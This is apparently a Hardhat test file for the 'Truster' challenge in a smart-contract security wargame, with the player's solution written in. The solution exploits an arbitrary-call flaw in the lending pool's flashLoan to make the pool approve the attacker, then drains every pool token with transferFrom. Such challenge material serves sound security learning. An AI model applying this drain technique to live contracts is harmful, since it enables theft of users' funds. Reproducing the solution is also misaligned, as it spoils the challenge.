const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // The pool contract has a vulnerability that allows anyone to make arbitrary calls 
        // to token contract on behalf of the pool contract

        // 1. Prepare the data for the approve call to the token contract
        const abi = ['function approve(address spender, uint256 amount) returns (bool)'];
        const iface = new ethers.utils.Interface(abi);
        const data = iface.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL]);

        // 2. Call flashLoan with the data
        await pool.connect(player).flashLoan(0n, player.address, token.address, data);

        // 3. Check the allowance
        expect(await token.allowance(pool.address, player.address)).to.equal(TOKENS_IN_POOL);

        // 4. Transfer all tokens from the pool to the player
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);

        // 5. Check the player's balance
        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

